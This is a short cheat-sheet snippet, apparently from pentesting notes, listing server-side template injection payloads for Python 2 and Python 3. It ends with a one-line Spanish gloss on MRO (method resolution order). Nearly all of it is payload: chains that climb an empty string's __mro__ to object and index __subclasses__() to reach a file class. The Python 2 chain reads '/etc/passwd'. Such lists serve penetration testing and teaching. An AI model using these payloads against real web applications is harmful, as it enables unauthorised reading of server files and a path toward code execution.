### SSTI
```
PYTHON_2
''.__class__
''.__class__.__mro__[2]
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
PYTHON_3
''.__class__
''.__class__.__mro__[1].__subclasses__()
''.__class__.__mro__[1].__subclasses__()[40]
dir(''.__class__.__mro__[1].__subclasses__()[40])
```

**MRO:** Método Orden de Resolución
